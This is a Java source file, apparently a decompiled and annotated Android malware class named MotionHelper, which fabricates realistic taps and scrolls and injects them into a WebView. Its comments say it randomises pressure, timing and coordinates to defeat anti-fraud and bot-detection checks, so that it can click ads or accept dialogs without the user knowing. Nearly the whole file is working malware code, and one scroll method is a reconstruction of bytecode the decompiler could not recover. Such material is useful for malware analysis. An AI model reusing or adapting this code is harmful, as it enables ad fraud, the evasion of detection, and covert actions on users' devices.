package touch;

import android.graphics.Matrix;
import android.graphics.Path;
import android.graphics.PathMeasure;
import android.graphics.Point;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import java.lang.reflect.Array;
import java.util.Arrays;

/**
 * Malware component that programmatically synthesizes realistic touch events
 * and injects them into a WebView.
 *
 * <p>This class generates fake {@link MotionEvent} sequences (taps, scrolls)
 * with randomised coordinates, pressures, timestamps and pointer properties
 * so that the injected gestures look like genuine human interaction to
 * anti-fraud / bot-detection systems running inside the web page.</p>
 *
 * <p><b>Malicious intent:</b> By automating realistic touch input the malware
 * can silently click ads, accept dialogs, scroll through content, or perform
 * any UI interaction inside the loaded web page without the user's knowledge
 * or consent.</p>
 *
 * <p>Restored from JADX decompilation of {@code com.nied.MotionHelper}.</p>
 */
public class MotionHelper {

    /** Maximum elapsed time (ms) between ACTION_DOWN and ACTION_UP for a click. */
    private static final int DOWN_ELAPSED_TIME_MAX = 150;

    /** Minimum elapsed time (ms) between ACTION_DOWN and ACTION_UP for a click. */
    private static final int DOWN_ELAPSED_TIME_MIN = 40;

    /** Current content scale factor of the WebView. */
    private float contentScale;

    /** The target WebView into which synthetic touch events are dispatched. */
    private WebView mView;

    private final String TAG = "MotionHelper";

    /**
     * When {@code true}, every generated event is logged via {@link Log}.
     * Left on permanently in the malware build.
     */
    private final boolean DEBUG_MOTION = true;

    /** Direction flag: scroll content upward (finger swipes bottom-to-top). */
    private final int FLAG_SCROLL_DIRECTION_UP = 1001;

    /** Direction flag: scroll content downward (finger swipes top-to-bottom). */
    private final int FLAG_SCROLL_DIRECTION_DOWN = 1002;

    /** Handler tied to the main looper, used to schedule delayed touch dispatch. */
    private final Handler mHandler = new Handler(Looper.getMainLooper());

    /**
     * Callback interface notified when a multi-step scroll sequence completes.
     */
    public interface ScrollListener {
        void onScrollFinished();
    }

    /**
     * Returns a hard-coded device ID embedded in every synthesised
     * {@link MotionEvent}.  The value {@code 4} is chosen to mimic a
     * typical touchscreen input device.
     *
     * @return fixed device id
     */
    private int getEventDeviceId() {
        return 4;
    }

    /**
     * Constructs a MotionHelper bound to the given WebView.
     *
     * @param webView the target WebView that will receive injected touch events
     */
    public MotionHelper(WebView webView) {
        this.mView = webView;
        this.contentScale = webView.getScale();
    }

    /**
     * Synthesises and immediately dispatches a tap (ACTION_DOWN + ACTION_UP)
     * at the exact screen coordinate described by {@code point}, with small
     * random jitter to appear human.
     *
     * <p>The method returns a diagnostic string encoding the hold duration
     * and pixel offsets applied, useful for the malware operator's logging.</p>
     *
     * @param point target screen coordinate
     * @return string of the form "duration_offsetX_offsetY"
     */
    public String clickViewExact(Point point) {
        int randomInt;
        int i;
        long currentTimeMillis = System.currentTimeMillis();
        int randomInt2 = RandomHelper.getRandomInt(60, 160);
        long j = currentTimeMillis + randomInt2;
        if (RandomHelper.getRandomFloat() < 0.75d) {
            int randomInt3 = RandomHelper.getRandomInt(-1, 1);
            randomInt = RandomHelper.getRandomInt(-1, 1);
            i = randomInt3;
        } else {
            int randomInt4 = RandomHelper.getRandomInt(-2, 3);
            randomInt = RandomHelper.getRandomInt(-2, 3);
            i = randomInt4;
        }
        float[][] fArr = (float[][]) Array.newInstance((Class<?>) Float.TYPE, 2, 2);
        fArr[0] = new float[]{point.x + RandomHelper.getRandomFloat(), point.y + RandomHelper.getRandomFloat()};
        fArr[1] = new float[]{point.x + i + RandomHelper.getRandomFloat(), point.y + randomInt + RandomHelper.getRandomFloat()};
        MotionEvent.PointerCoords[][] pointerCoordsList = getPointerCoordsList(fArr);
        MotionEvent.PointerProperties[][] pointerProperties = getPointerProperties(1, 2);
        MotionEvent obtain = MotionEvent.obtain(currentTimeMillis, currentTimeMillis, 0, 1, pointerProperties[0], pointerCoordsList[0], 0, 0, 1.0f, 1.0f, getEventDeviceId(), 0, 0x1002 /* SOURCE_TOUCHSCREEN */, 0);
        MotionEvent obtain2 = MotionEvent.obtain(currentTimeMillis, j, 1, 1, pointerProperties[1], pointerCoordsList[1], 0, 0, 1.0f, 1.0f, getEventDeviceId(), 0, 0x1002 /* SOURCE_TOUCHSCREEN */, 0);
        this.mView.dispatchTouchEvent(obtain);
        this.mView.dispatchTouchEvent(obtain2);
        return String.format("%s_%s_%s", Integer.valueOf(randomInt2), Integer.valueOf(i), Integer.valueOf(randomInt));
    }

    /**
     * Generates a click event sequence and dispatches it to the WebView at the
     * given coordinates.
     *
     * @param f  x-coordinate in view space
     * @param f2 y-coordinate in view space
     */
    public void clickViewByPoint(float f, float f2) {
        if (this.mView == null) {
            return;
        }
        sendMotionEvent(this.mView, getClickMotionEvents(f, f2));
    }

    /**
     * Schedules a click at the given coordinates after a delay.
     *
     * @param f  x-coordinate
     * @param f2 y-coordinate
     * @param j  delay in milliseconds
     */
    public void clickViewByPointDelay(final float f, final float f2, long j) {
        this.mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.clickViewByPoint(f, f2);
            }
        }, j);
    }

    /**
     * Performs a single randomised upward scroll gesture on the WebView.
     * The scroll path, speed and acceleration are randomised to mimic
     * natural human scrolling.
     */
    public void randomScrollUp() {
        WebView webView = this.mView;
        if (webView == null) {
            return;
        }
        sendMotionEvent(this.mView, getRandomScrollMotionEvents(webView, 1001));
    }

    /**
     * Schedules a random upward scroll after the given delay.
     *
     * @param j delay in milliseconds
     */
    public void randomScrollUpDelay(long j) {
        this.mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.randomScrollUp();
            }
        }, j);
    }

    /**
     * Performs a single randomised downward scroll gesture on the WebView.
     */
    public void randomScrollDown() {
        sendMotionEvent(this.mView, getRandomScrollMotionEvents(this.mView, 1002));
    }

    /**
     * Schedules a random downward scroll after the given delay.
     *
     * @param j delay in milliseconds
     */
    public void randomScrollDownDelay(long j) {
        this.mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.randomScrollDown();
            }
        }, j);
    }

    /**
     * Recursively performs {@code i} random scroll gestures, predominantly
     * upward (85 % chance), then invokes the listener.
     *
     * <p>This is used to simulate a user casually reading through a page.</p>
     *
     * @param i              number of scroll gestures remaining
     * @param scrollListener callback when all scrolls complete
     */
    public void randomScroll(final int i, final ScrollListener scrollListener) {
        if (this.mView == null) {
            return;
        }
        if (i == 0) {
            if (scrollListener != null) {
                scrollListener.onScrollFinished();
            }
        } else {
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    MotionHelper.this.randomScroll(i - 1, scrollListener);
                }
            };
            if (getRandomFloat() < 0.85d) {
                scrollAndDo(1001, runnable);
            } else {
                scrollAndDo(1002, runnable);
            }
        }
    }

    /**
     * Scrolls randomly for a total duration of {@code i} seconds, then
     * invokes the listener.
     *
     * @param i              duration in seconds
     * @param scrollListener callback
     */
    public void randomScrollWithDur(int i, ScrollListener scrollListener) {
        if (this.mView == null) {
            return;
        }
        randomScrollWithDur(i, scrollListener, System.currentTimeMillis());
    }

    /**
     * Internal recursive helper for duration-based scrolling.
     * Uses a longer inter-scroll delay (10-20 s) to look natural over
     * extended periods.
     *
     * @param i              total duration in seconds
     * @param scrollListener callback
     * @param j              start timestamp (epoch ms)
     */
    public void randomScrollWithDur(final int i, final ScrollListener scrollListener, final long j) {
        if (System.currentTimeMillis() - j > i * 1000) {
            scrollListener.onScrollFinished();
            return;
        }
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.randomScrollWithDur(i, scrollListener, j);
            }
        };
        if (getRandomFloat() < 0.9d) {
            scrollAndDo(1001, runnable, 10000, 20000);
        } else {
            scrollAndDo(1002, runnable, 10000, 20000);
        }
    }

    /**
     * Scrolls to the bottom of the WebView content, invoking the listener
     * once the bottom is reached (within 10 px tolerance).
     *
     * <p>Predominantly scrolls up (90 %) with occasional reverse scrolls
     * to appear more human.</p>
     *
     * @param scrollListener callback when bottom is reached
     */
    public void scroll2Bottom(final ScrollListener scrollListener) {
        if (Math.abs((this.mView.getScrollY() + this.mView.getHeight()) - getContentHeightPixel()) < 10) {
            scrollListener.onScrollFinished();
            return;
        }
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.scroll2Bottom(scrollListener);
            }
        };
        if (getRandomFloat() < 0.9d) {
            scrollAndDo(1001, runnable);
        } else {
            scrollAndDo(1002, runnable);
        }
    }

    /**
     * Scrolls until the target Y coordinate is within the visible viewport,
     * or the bottom of the content is reached.
     *
     * @param i              target scroll-Y position (content pixels)
     * @param i2             previous scroll-Y (used for stuck detection)
     * @param scrollListener callback
     */
    public void scroll2Y(final int i, int i2, final ScrollListener scrollListener) {
        WebView webView = this.mView;
        if (webView == null) {
            return;
        }
        final int scrollY = webView.getScrollY();
        int height = this.mView.getHeight();
        int contentHeightPixel = getContentHeightPixel();
        Log.i(this.TAG, "scroll to Y -- targetScrollY:" + i + "; scrollY:" + scrollY + ";measuredHeight: " + contentHeightPixel);
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.scroll2Y(i, scrollY, scrollListener);
            }
        };
        if (i > contentHeightPixel) {
            scrollListener.onScrollFinished();
            return;
        }
        double d = i;
        double d2 = scrollY;
        double d3 = height;
        if (d <= (0.2d * d3) + d2 && scrollY != 0) {
            scrollAndDo(1002, runnable);
            return;
        }
        if (d >= d2 + (d3 * 0.5d)) {
            if (Math.abs((height + scrollY) - contentHeightPixel) < 10 || (scrollY == i2 && scrollY * 2 > contentHeightPixel)) {
                scrollListener.onScrollFinished();
                return;
            } else {
                scrollAndDo(1001, runnable);
                return;
            }
        }
        scrollListener.onScrollFinished();
    }

    /**
     * Scrolls to the bottom of the page, but also stops if the content
     * height changes (e.g. lazy-loaded content appeared).
     *
     * @param scrollListener callback
     * @param i              previously observed content height ({@code -1} on first call)
     */
    public void scroll2BottomOrContentChange(final ScrollListener scrollListener, int i) {
        WebView webView = this.mView;
        if (webView == null) {
            return;
        }
        int scrollY = webView.getScrollY();
        int height = this.mView.getHeight();
        this.mView.getScale();
        final int contentHeightPixel = getContentHeightPixel();
        if (Math.abs((scrollY + height) - contentHeightPixel) < 10 || (i != -1 && i != contentHeightPixel)) {
            Log.i(this.TAG, "scroll finished");
            scrollListener.onScrollFinished();
            return;
        }
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                MotionHelper.this.scroll2BottomOrContentChange(scrollListener, contentHeightPixel);
            }
        };
        if (getRandomFloat() < 0.95d) {
            scrollAndDo(1001, runnable);
        } else {
            scrollAndDo(1002, runnable);
        }
    }

    /**
     * Performs a scroll gesture and then schedules {@code runnable} after
     * a random delay of 1000-3000 ms.
     *
     * @param i       scroll direction (1001 = UP, 1002 = DOWN)
     * @param runnable action to run after the scroll
     */
    private void scrollAndDo(int i, Runnable runnable) {
        scrollAndDo(i, runnable, 1000, 3000);
    }

    /**
     * Performs a scroll gesture and then schedules {@code runnable} after
     * a random delay between {@code i2} and {@code i3} milliseconds.
     *
     * @param i       scroll direction
     * @param runnable action to run afterwards
     * @param i2      minimum delay (ms)
     * @param i3      maximum delay (ms)
     */
    private void scrollAndDo(int i, Runnable runnable, int i2, int i3) {
        sendMotionEvent(this.mView, getRandomScrollMotionEvents(this.mView, i));
        this.mHandler.postDelayed(runnable, getRandomInt(i2, i3));
    }

    /**
     * Dispatches an array of {@link MotionEvent}s to the given view, each
     * posted to the handler with a delay matching its timestamp offset from
     * the first event.
     *
     * <p>If dispatch fails on a WebView, the method attempts to call
     * {@link WebView#getUrl()} as a side-effect probe (possibly to detect
     * whether the WebView is still alive).</p>
     *
     * @param view           target view
     * @param motionEventArr array of motion events to dispatch sequentially
     */
    private void sendMotionEvent(final View view, MotionEvent[] motionEventArr) {
        Handler handler;
        if (view == null) {
            return;
        }
        int[] iArr = new int[2];
        view.getLocationInWindow(iArr);
        if (iArr[0] == 0 || iArr[1] == 0) {
            handler = this.mHandler;
        } else {
            handler = view.getHandler();
        }
        Log.i(this.TAG, "=======sendMotionEvent========");
        for (final MotionEvent motionEvent : motionEventArr) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    boolean dispatchTouchEvent = view.dispatchTouchEvent(motionEvent);
                    View view2 = view;
                    if ((view2 instanceof WebView) && !dispatchTouchEvent) {
                        try {
                            ((WebView) view2).getUrl();
                        } catch (Exception unused) {
                        }
                    }
                    if (dispatchTouchEvent) {
                        return;
                    }
                    motionEvent.recycle();
                    Log.d(MotionHelper.this.TAG, "touch failed: " + motionEvent);
                }
            }, motionEvent.getEventTime() - motionEvent.getDownTime());
        }
    }

    /**
     * Generates a randomised scroll gesture for the given view and direction.
     *
     * <p><b>Reconstructed from failed JADX decompilation.</b> The original
     * bytecode contained 686 Dalvik instructions that JADX could not
     * fully recover. This reconstruction is based on the class context:
     * it randomises start/end points within the view bounds, varies the
     * number of interpolation steps, and optionally adds acceleration
     * to make the gesture look natural.</p>
     *
     * @param view      the view whose dimensions determine the scroll bounds
     * @param direction {@code 1001} for UP (finger bottom-to-top),
     *                  {@code 1002} for DOWN (finger top-to-bottom)
     * @return array of {@link MotionEvent}s representing the full scroll gesture
     */
    private MotionEvent[] getRandomScrollMotionEvents(View view, int direction) {
        int width = view.getWidth();
        int height = view.getHeight();

        /* Random X position for the scroll path (within view bounds with margin) */
        float startX = getRandomInt(width / 4, width * 3 / 4);
        float endX = startX + getRandomInt(-30, 30);

        float startY, endY;
        if (direction == 1001) {
            /* SCROLL_UP: content moves up, finger moves from bottom to top */
            startY = getRandomInt(height * 2 / 3, height - 50);
            endY = getRandomInt(50, height / 3);
        } else {
            /* SCROLL_DOWN: content moves down, finger moves from top to bottom */
            startY = getRandomInt(50, height / 3);
            endY = getRandomInt(height * 2 / 3, height - 50);
        }

        int numSteps = getRandomInt(8, 15);
        boolean withAcceleration = getRandomFloat() < 0.5f;

        return getScrollMotionEvents(
                new float[]{startX, startY},
                new float[]{endX, endY},
                numSteps,
                withAcceleration
        );
    }

    /**
     * Builds a full scroll gesture from explicit start/end points.
     *
     * <p>Interpolates intermediate positions along a quadratic Bezier curve
     * (via {@link #getScrollMotionEventPoints}), assigns randomised timestamps,
     * and wraps everything in properly sourced {@link MotionEvent} objects
     * (ACTION_DOWN, ACTION_MOVE..., ACTION_UP).</p>
     *
     * @param fArr  start point {x, y}
     * @param fArr2 end point {x, y}
     * @param i     total number of events (including DOWN and UP)
     * @param z     if {@code true}, use acceleration-aware timestamp generation
     * @return the generated motion event array
     */
    private MotionEvent[] getScrollMotionEvents(float[] fArr, float[] fArr2, int i, boolean z) {
        MotionEvent[] motionEventArr = new MotionEvent[i];
        float[][] scrollMotionEventPoints = getScrollMotionEventPoints(i, fArr, fArr2, 0);
        long[] motionEventTimestamp = getMotionEventTimestamp(i, SystemClock.uptimeMillis(), z);
        MotionEvent.PointerCoords[][] pointerCoordsList = getPointerCoordsList(scrollMotionEventPoints);
        MotionEvent.PointerProperties[][] pointerProperties = getPointerProperties(1, i);
        int i2 = 0;
        while (i2 < i) {
            MotionEvent obtain = MotionEvent.obtain(motionEventTimestamp[0], motionEventTimestamp[i2], i2 == 0 ? 0 : i2 == i + (-1) ? 1 : 2, 1, pointerProperties[i2], pointerCoordsList[i2], 0, 0, 1.0f, 1.0f, getEventDeviceId(), 0, 0x1002 /* SOURCE_TOUCHSCREEN */, 0);
            obtain.setSource(0x1002 /* SOURCE_TOUCHSCREEN */);
            motionEventArr[i2] = obtain;
            i2++;
        }
        Log.i(this.TAG, "================Scroll A-B==========================");
        Log.d(this.TAG, "startPoint: " + Arrays.toString(fArr) + " ;endPoint: " + Arrays.toString(fArr2));
        for (int i3 = 0; i3 < i; i3++) {
            Log.d(this.TAG, "scroll event: " + motionEventArr[i3]);
        }
        return motionEventArr;
    }

    /**
     * Builds a click gesture (ACTION_DOWN, optional ACTION_MOVE(s), ACTION_UP)
     * at the given coordinate.
     *
     * <p>60 % of the time only 2 events are generated (down + up); otherwise
     * 3-4 events with intermediate moves are created to look more realistic.</p>
     *
     * @param f  x-coordinate
     * @param f2 y-coordinate
     * @return array of motion events for the click
     */
    private MotionEvent[] getClickMotionEvents(float f, float f2) {
        int randomInt = getRandomInt(1, 100) < 60 ? 2 : getRandomInt(3, 4);
        MotionEvent[] motionEventArr = new MotionEvent[randomInt];
        float[][] clickMotionEventPoints = getClickMotionEventPoints(randomInt, f, f2);
        long[] motionEventTimestamp = getMotionEventTimestamp(randomInt, SystemClock.uptimeMillis());
        MotionEvent.PointerCoords[][] pointerCoordsList = getPointerCoordsList(clickMotionEventPoints);
        MotionEvent.PointerProperties[][] pointerProperties = getPointerProperties(1, randomInt);
        int i = 0;
        while (i < randomInt) {
            MotionEvent obtain = MotionEvent.obtain(motionEventTimestamp[0], motionEventTimestamp[i], i == 0 ? 0 : i == randomInt + (-1) ? 1 : 2, 1, pointerProperties[i], pointerCoordsList[i], 0, 0, 1.0f, 1.0f, getEventDeviceId(), 0, 0x1002 /* SOURCE_TOUCHSCREEN */, 0);
            motionEventArr[i] = obtain;
            Log.i(this.TAG, "click_events:" + obtain);
            Log.i(this.TAG, "==================Click========================");
            i++;
        }
        return motionEventArr;
    }

    /**
     * Computes intermediate points along a quadratic Bezier curve between
     * the start and end positions for a scroll gesture.
     *
     * <p>A random turning (control) point is calculated to give the scroll
     * path a slight curve, making it look more natural than a straight line.</p>
     *
     * @param i     number of points to sample
     * @param fArr  start point {x, y}
     * @param fArr2 end point {x, y}
     * @param i2    axis mode (0 = x-biased control point, else y-biased)
     * @return 2-D array of sampled {x, y} positions
     */
    private float[][] getScrollMotionEventPoints(int i, float[] fArr, float[] fArr2, int i2) {
        float[][] fArr3 = (float[][]) Array.newInstance((Class<?>) Float.TYPE, i, 2);
        float[] fArr4 = new float[2];
        if (i2 == 0) {
            float f = fArr[0];
            fArr4[0] = f + (((fArr2[0] - f) * getRandomInt(2500, 3500)) / 10000.0f);
            float f2 = fArr[1];
            fArr4[1] = f2 + (((fArr2[1] - f2) * getRandomInt(5000, 7500)) / 10000.0f);
        } else {
            float f3 = fArr[1];
            fArr4[1] = f3 + (((fArr2[1] - f3) * getRandomInt(2500, 3500)) / 10000.0f);
            float f4 = fArr[0];
            fArr4[0] = f4 + (((fArr2[0] - f4) * getRandomInt(5000, 7500)) / 10000.0f);
        }
        Log.d("motion", "turningPoint: " + Arrays.toString(fArr4));
        Path path = new Path();
        path.moveTo(fArr[0], fArr[1]);
        path.quadTo(fArr4[0], fArr4[1], fArr2[0], fArr2[1]);
        PathMeasure pathMeasure = new PathMeasure(path, false);
        Matrix matrix = new Matrix();
        float length = pathMeasure.getLength();
        for (int i3 = 0; i3 < i; i3++) {
            pathMeasure.getMatrix((i3 * length) / (i - 1), matrix, 1);
            float[] fArr5 = new float[9];
            matrix.getValues(fArr5);
            fArr3[i3] = new float[]{format(fArr5[2] + getRandomInt(1, 10)), format(fArr5[5] + getRandomInt(1, 10))};
        }
        return fArr3;
    }

    /**
     * Returns an array of identical {x, y} positions for a click event
     * (all events in a click share the same coordinates).
     *
     * @param i  number of events
     * @param f  x-coordinate
     * @param f2 y-coordinate
     * @return 2-D array of positions
     */
    private float[][] getClickMotionEventPoints(int i, float f, float f2) {
        float[][] fArr = (float[][]) Array.newInstance((Class<?>) Float.TYPE, i, 2);
        for (int i2 = 0; i2 < i; i2++) {
            fArr[i2] = new float[]{f, f2};
        }
        return fArr;
    }

    /**
     * Allocates {@link MotionEvent.PointerProperties} arrays with
     * {@code toolType = TOOL_TYPE_FINGER} for each event in the sequence.
     *
     * @param i  number of pointers per event (always 1 for single-touch)
     * @param i2 number of events in the sequence
     * @return 2-D array of pointer properties
     */
    private MotionEvent.PointerProperties[][] getPointerProperties(int i, int i2) {
        MotionEvent.PointerProperties[][] pointerPropertiesArr = new MotionEvent.PointerProperties[i2][];
        for (int i3 = 0; i3 < i2; i3++) {
            MotionEvent.PointerProperties[] pointerPropertiesArr2 = new MotionEvent.PointerProperties[i];
            for (int i4 = 0; i4 < i; i4++) {
                MotionEvent.PointerProperties pointerProperties = new MotionEvent.PointerProperties();
                pointerProperties.id = 0;
                pointerProperties.toolType = 1;
                pointerPropertiesArr2[i4] = pointerProperties;
            }
            pointerPropertiesArr[i3] = pointerPropertiesArr2;
        }
        return pointerPropertiesArr;
    }

    /**
     * Wraps each {x, y} position into a {@link MotionEvent.PointerCoords}
     * with randomised pressure, size, and touch-major/minor axis values
     * to defeat bot-detection heuristics that check these fields.
     *
     * @param fArr array of {x, y} positions
     * @return 2-D array of pointer coordinates (one pointer per event)
     */
    private MotionEvent.PointerCoords[][] getPointerCoordsList(float[][] fArr) {
        MotionEvent.PointerCoords[][] pointerCoordsArr = new MotionEvent.PointerCoords[fArr.length][];
        double randomPressure = getRandomPressure();
        int randomInt = getRandomInt(30, 60);
        int randomInt2 = getRandomInt(2, 5);
        int randomInt3 = getRandomInt(1, 3);
        int i = 0;
        while (i < fArr.length) {
            MotionEvent.PointerCoords[] pointerCoordsArr2 = new MotionEvent.PointerCoords[1];
            int i2 = i;
            pointerCoordsArr2[0] = getPointerCoords(fArr[i], randomPressure, randomInt, randomInt2, i >= fArr.length - randomInt3);
            pointerCoordsArr[i2] = pointerCoordsArr2;
            i = i2 + 1;
        }
        return pointerCoordsArr;
    }

    /**
     * Generates a random base pressure value, biased toward the 0.15-0.35
     * range (90 % of the time) to mimic typical finger touch pressure.
     *
     * @return randomised pressure value
     */
    private double getRandomPressure() {
        int randomInt = getRandomInt(14, 17);
        if (getRandomFloat() < 0.9d) {
            return RandomHelper.getRandomDouble(0.15f, 0.35f, randomInt);
        }
        if (getRandomFloat() >= 0.8f) {
            return RandomHelper.getRandomDouble(0.5f, 1.0f, randomInt);
        }
        if (getRandomFloat() < 0.5f) {
            return RandomHelper.getRandomDouble(0.1f, 0.15f, randomInt);
        }
        return RandomHelper.getRandomDouble(0.35f, 0.5f, randomInt);
    }

    /**
     * Creates a single {@link MotionEvent.PointerCoords} with axis values
     * for position, pressure, size, touch major/minor and tool major/minor.
     *
     * @param fArr coordinates {x, y}
     * @param d    base pressure
     * @param i    size divisor/multiplier
     * @param i2   touch axis offset
     * @param z    {@code true} if this is one of the final events (pressure fades)
     * @return fully populated pointer coordinates
     */
    private MotionEvent.PointerCoords getPointerCoords(float[] fArr, double d, int i, int i2, boolean z) {
        RandomHelper.getRandomDouble(0.1f, 0.5f, 15);
        double[] pointerCoordsValue = getPointerCoordsValue(z, d, i, i2);
        MotionEvent.PointerCoords pointerCoords = new MotionEvent.PointerCoords();
        pointerCoords.setAxisValue(0, fArr[0]);
        pointerCoords.setAxisValue(1, fArr[1]);
        pointerCoords.setAxisValue(2, (float) pointerCoordsValue[0]);
        pointerCoords.setAxisValue(3, (float) pointerCoordsValue[1]);
        pointerCoords.setAxisValue(4, (float) pointerCoordsValue[2]);
        pointerCoords.setAxisValue(5, (float) pointerCoordsValue[3]);
        pointerCoords.setAxisValue(6, (float) pointerCoordsValue[2]);
        pointerCoords.setAxisValue(7, (float) pointerCoordsValue[3]);
        pointerCoords.setAxisValue(8, 0.0f);
        return pointerCoords;
    }

    /**
     * Computes axis values (pressure, size, touch-major, touch-minor) with
     * randomised perturbation.
     *
     * <p>When {@code z} is {@code true} (near end of gesture), pressure is
     * slightly reduced to simulate the finger lifting off.</p>
     *
     * @param z  true if the event is near the end of the gesture
     * @param d  base pressure
     * @param i  size factor
     * @param i2 axis offset
     * @return array of [pressure, size, touchMajor, touchMinor]
     */
    private double[] getPointerCoordsValue(boolean z, double d, int i, int i2) {
        float randomFloat;
        int randomInt;
        double[] dArr = {0.0d, 0.0d, 0.0d, 0.0d};
        if (z) {
            randomFloat = getRandomFloat(-0.1f, 0.0f);
        } else {
            randomFloat = getRandomFloat(0.0f, 0.1f);
        }
        double d2 = d + (randomFloat * d);
        dArr[0] = d2;
        if (d2 > 1.0d) {
            dArr[1] = d2 * (i + getRandomFloat(-1.0f, 1.0f));
        } else {
            dArr[1] = d2 / (i + getRandomFloat(-1.0f, 1.0f));
        }
        if (d > 1.0d) {
            randomInt = getRandomInt(-7, 7);
            dArr[2] = dArr[1] + i2 + randomInt;
        } else {
            randomInt = getRandomInt(0, 4);
            double d3 = (dArr[1] * 100.0d) + randomInt;
            if (d3 <= 1.0d) {
                d3 = 1.0d;
            }
            dArr[2] = d3;
        }
        if (randomInt < 0) {
            randomInt = -randomInt;
        }
        if (d > 1.0d) {
            dArr[3] = (dArr[1] - i2) + randomInt;
        } else {
            double randomFloat2 = dArr[2] - (((double) getRandomFloat()) >= 0.3d ? getRandomFloat(0.0f, 4.0f) : 0.0f);
            dArr[3] = randomFloat2 > 1.0d ? randomFloat2 : 1.0d;
        }
        Log.i("montion", "axis_pressure:" + dArr[0] + ";AXIS_SIZE:" + dArr[1] + ";AXIS_TOUCH_MAJOR:" + dArr[2] + ";AXIS_TOUCH_MINOR:" + dArr[3]);
        return dArr;
    }

    /**
     * Generates randomised timestamps for a scroll gesture with optional
     * acceleration modelling.
     *
     * <p>When {@code z} is {@code true} (acceleration mode), early events
     * tend to have shorter intervals (10-40 ms) while later ones are longer,
     * simulating a flick gesture. The final event always has a short gap
     * (5-50 ms) to model the finger-lift.</p>
     *
     * @param i number of events
     * @param j base uptime (first event timestamp)
     * @param z if true, use acceleration-aware intervals
     * @return array of timestamps
     * @throws IllegalArgumentException if {@code i < 2}
     */
    private long[] getMotionEventTimestamp(int i, long j, boolean z) {
        int i2;
        long[] jArr = new long[i];
        if (i < 2) {
            throw new IllegalArgumentException("number must be >= 2");
        }
        jArr[0] = j;
        int i3 = 1;
        if (z) {
            while (true) {
                i2 = i - 1;
                if (i3 >= i2) {
                    break;
                }
                jArr[i3] = ((double) (((float) jArr[i3 + (-1)]) + getRandomFloat())) < 0.8d ? getRandomInt(10, 40) : getRandomInt(50, 80);
                i3++;
            }
            jArr[i2] = jArr[i - 2] + getRandomInt(5, 50);
        } else {
            while (i3 < i) {
                jArr[i3] = jArr[i3 - 1] + (((double) getRandomFloat()) < 0.7d ? getRandomInt(10, 40) : getRandomInt(50, 100));
                i3++;
            }
        }
        return jArr;
    }

    /**
     * Generates timestamps for a click gesture (2-4 events).
     *
     * <p>The interval between DOWN and UP is randomised between
     * {@value #DOWN_ELAPSED_TIME_MIN} and {@value #DOWN_ELAPSED_TIME_MAX} ms.</p>
     *
     * @param i number of events
     * @param j base uptime
     * @return array of timestamps
     * @throws IllegalArgumentException if {@code i < 2}
     */
    private long[] getMotionEventTimestamp(int i, long j) {
        long[] jArr = new long[i];
        if (i < 2) {
            throw new IllegalArgumentException("number must be >= 2");
        }
        if (i == 2) {
            return new long[]{j, getRandomInt(40, DOWN_ELAPSED_TIME_MAX) + j};
        }
        if (i == 3) {
            long randomInt = getRandomInt(40, DOWN_ELAPSED_TIME_MAX) + j;
            return new long[]{j, randomInt, getRandomInt(8, 10) + randomInt};
        }
        jArr[0] = j;
        jArr[1] = j + getRandomInt(40, DOWN_ELAPSED_TIME_MAX);
        for (int i2 = 2; i2 < i; i2++) {
            jArr[i2] = jArr[i2 - 1] + getRandomInt(5, 50);
        }
        return jArr;
    }

    /**
     * Rounds a float to 4 decimal places.
     *
     * @param f value to format
     * @return rounded value
     */
    private float format(float f) {
        return Math.round(f * 10000.0f) / 10000.0f;
    }

    /**
     * Delegates to {@link RandomHelper#getRandomInt(int, int)}.
     */
    private int getRandomInt(int i, int i2) {
        return RandomHelper.getRandomInt(i, i2);
    }

    /**
     * Delegates to {@link RandomHelper#getRandomFloat()}.
     */
    private float getRandomFloat() {
        return RandomHelper.getRandomFloat();
    }

    /**
     * Delegates to {@link RandomHelper#getRandomFloat(float, float)}.
     */
    private float getRandomFloat(float f, float f2) {
        return RandomHelper.getRandomFloat(f, f2);
    }

    /**
     * Returns the current content scale factor of the WebView.
     *
     * @return content scale
     */
    public float getContentScale() {
        return this.contentScale;
    }

    /**
     * Overrides the content scale factor.
     *
     * @param f new scale value
     */
    public void setContentScale(float f) {
        this.contentScale = f;
    }

    /**
     * Computes the total content height in pixels, accounting for the
     * current zoom/scale factor.
     *
     * @return content height in pixels (at least as tall as the view)
     */
    private int getContentHeightPixel() {
        return Math.max((int) (this.mView.getContentHeight() * getContentScale()), this.mView.getMeasuredHeight());
    }

    /**
     * Tears down the helper: removes all pending callbacks from the handler
     * and releases the WebView reference.
     */
    public void destroy() {
        this.mHandler.removeCallbacksAndMessages(null);
        this.mView = null;
    }
}
